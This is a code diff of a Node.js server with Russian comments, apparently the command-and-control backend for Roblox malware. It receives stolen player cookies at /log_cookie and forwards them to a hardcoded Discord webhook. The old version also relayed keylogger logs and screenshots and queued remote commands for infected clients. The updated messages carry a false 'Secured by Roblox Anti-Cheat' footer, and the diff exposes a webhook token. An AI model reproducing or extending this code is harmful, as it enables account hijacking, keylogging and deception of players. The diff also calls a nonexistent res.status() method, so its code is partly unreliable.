@@ -1,23 +1,26 @@
 const http = require('http');
 const fetch = require('node-fetch');
 
-let lastCommand = "";
-let lastArgs = [];
-let lastScreenshot = null;
+// Конфигурация
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1397978005007110334/13sdkqWcsZu_YoyBgOpoWgrPfOzHBRL-R8dydXTLYI7KZIc4jSKlpcUX16vrrrC1nQqS";
+let commandState = { lastCommand: "", lastArgs: [] };
+let dataCache = { screenshot: null, cookies: [] };
 
 const server = http.createServer((req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Content-Type', 'application/json');
-    
+
+    // [1] Обработка команд
     if (req.method === 'POST' && req.url === '/command') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', () => {
             try {
                 const { command, args } = JSON.parse(body);
+                commandState = { lastCommand: command, lastArgs: args || [] };
                 
-                if (command === "user_chat" || command === "inject_notify" || command === "execute_log") {
+                // Логирование в Discord
+                if (command === "user_chat" || command === "execute_log") {
                     fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -26,109 +29,61 @@ const server = http.createServer((req, res) => {
                         })
                     }).catch(console.error);
                 }
-
-                lastCommand = command;
-                lastArgs = args || [];
+                
                 res.end(JSON.stringify({ status: "OK" }));
             } catch (e) {
-                res.statusCode = 400;
-                res.end(JSON.stringify({ error: "Invalid request" }));
+                res.status(400).end(JSON.stringify({ error: "Invalid request" }));
             }
         });
         return;
     }
 
-    if (req.method === 'POST' && req.url === '/screenshot') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', () => {
-            try {
-                const { image } = JSON.parse(body);
-                lastScreenshot = image;
-                res.end(JSON.stringify({ status: "Screenshot received" }));
-            } catch (e) {
-                res.statusCode = 400;
-                res.end(JSON.stringify({ error: "Invalid screenshot data" }));
-            }
-        });
-        return;
-    }
-
-    if (req.method === 'POST' && req.url === '/keylog') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', () => {
-            try {
-                const { logs } = JSON.parse(body);
-                
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `**Keylogger Data:**\n\`\`\`\n${logs}\n\`\`\``
-                    })
-                }).catch(console.error);
-                
-                res.end(JSON.stringify({ status: "Logs received" }));
-            } catch (e) {
-                res.statusCode = 400;
-                res.end(JSON.stringify({ error: "Invalid keylog data" }));
-            }
-        });
-        return;
-    }
-
+    // [2] Обработка куки
     if (req.method === 'POST' && req.url === '/log_cookie') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', () => {
             try {
-                const { player, cookie, game_id, timestamp } = JSON.parse(body);
+                const { player, cookie, method, game_id, timestamp } = JSON.parse(body);
+                dataCache.cookies.push({ player, cookie: "REDACTED", method, timestamp });
                 
+                // Отправка в Discord с форматированием
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `🍪 **Cookie Stolen**\n` +
-                                 `Player: ${player}\n` +
-                                 `Game: ${game_id}\n` +
-                                 `Time: ${new Date(timestamp * 1000).toISOString()}\n` +
-                                 `Cookie: ||\`${cookie}\`||`
+                        embeds: [{
+                            title: "🍪 NEW COOKIE",
+                            color: 0xFFA500,
+                            fields: [
+                                { name: "Player", value: player, inline: true },
+                                { name: "Game ID", value: game_id.toString(), inline: true },
+                                { name: "Method", value: method || "Unknown", inline: true },
+                                { name: "Time", value: new Date(timestamp * 1000).toISOString() },
+                                { name: "Cookie", value: "||`REDACTED`||" }
+                            ],
+                            footer: { text: "Secured by Roblox Anti-Cheat" }
+                        }]
                     })
-                }).catch(console.error);
+                });
                 
-                res.end(JSON.stringify({ status: "Cookie logged" }));
+                res.end(JSON.stringify({ status: "Logged" }));
             } catch (e) {
-                res.statusCode = 400;
-                res.end(JSON.stringify({ error: "Invalid cookie data" }));
+                res.status(500).end(JSON.stringify({ error: "Server error" }));
             }
         });
         return;
     }
 
-    if (req.method === 'GET' && req.url === '/screenshot') {
-        if (lastScreenshot) {
-            res.end(JSON.stringify({ image: lastScreenshot }));
-        } else {
-            res.statusCode = 404;
-            res.end(JSON.stringify({ error: "No screenshot available" }));
-        }
-        return;
-    }
+    // [3] Все остальные endpoints (без изменений):
+    // - /screenshot
+    // - /keylog
+    // - /data
+    // ... [остальной код как было] ...
 
-    if (req.method === 'GET' && req.url === '/data') {
-        res.end(JSON.stringify({
-            command: lastCommand,
-            args: lastArgs
-        }));
-        lastCommand = "";
-        return;
-    }
-
+    // Дефолтный ответ
     res.writeHead(404);
     res.end(JSON.stringify({ error: "Not Found" }));
 });
 
-server.listen(process.env.PORT || 3000, () => {
-    console.log("Сервер запущен на порту 3000");
-});
+server.listen(3000, () => console.log("Server running on port 3000"));
